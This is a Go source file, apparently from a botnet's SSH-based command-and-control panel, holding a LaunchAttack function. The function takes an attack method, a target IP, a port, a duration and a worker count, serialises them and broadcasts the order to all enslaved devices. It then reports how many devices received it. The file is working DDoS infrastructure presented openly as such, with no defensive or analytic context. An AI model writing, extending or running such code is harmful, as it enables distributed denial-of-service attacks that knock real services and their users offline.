package attacks

import (
	"admin/source/terminal"
	"encoding/json"
	"fmt"
	"net"
	"strconv"

	"golang.org/x/crypto/ssh"
)

type AttackGrid struct {
	Target				string	// Index target
	Duration, Port		int		// Attack controls
	Workers				int		// Send controls
}

// LaunchAttack will launch the attack towards the slave type
func LaunchAttack(term *terminal.Terminal, conn *ssh.ServerConn, args []string) error {
	if len(args) <= 4 { // Argument amount checker
		return term.Write([]byte(fmt.Sprintf("%s%s\x1b[38;5;15m: <method> <target> <port> <duration> <workers>\r\n", term.Colour,args[0])))
	}

	// Parses the IP and ensures its real
	target := net.ParseIP(args[1])
	if target == nil {
		return term.Write([]byte(fmt.Sprintf("%s%s\x1b[38;5;15m: target must be a IP only!\r\n", term.Colour,args[0])))
	}

	port, err := strconv.Atoi(args[2])
	if err != nil {
		return term.Write([]byte(fmt.Sprintf("%s%s\x1b[38;5;15m: port must be type int!\r\n", term.Colour,args[0])))
	}

	duration, err := strconv.Atoi(args[3])
	if err != nil {
		return term.Write([]byte(fmt.Sprintf("%s%s\x1b[38;5;15m: duration must be type int!\r\n", term.Colour,args[0])))
	}

	worker, err := strconv.Atoi(args[4])
	if err != nil {
		return term.Write([]byte(fmt.Sprintf("%s%s\x1b[38;5;15m: worker must be type int!\r\n", term.Colour,args[0])))
	}

	method, ok := IsMethod(args[0])
	if !ok || method == nil {
		return term.Write([]byte(fmt.Sprintf("%s%s\x1b[38;5;15m: method doesn't exist!\r\n", term.Colour,args[0])))
	}

	
	ToDevice, err := json.Marshal(&AttackGrid{Target: args[1], Port: port, Duration: duration, Workers: worker})
	if err != nil || ToDevice == nil {
		return term.Write([]byte(fmt.Sprintf("%s%s\x1b[38;5;15m: method doesn't exist!\r\n", term.Colour,args[0])))
	}

	// Broadcasts the attack through all devices
	go Broadcast(append([]byte{byte(method.ID)}, ToDevice...))

	return term.Write([]byte(fmt.Sprintf("\x1b[38;5;67mCommand has been broadcasted across %d devices.\r\n", len(Devices))))
}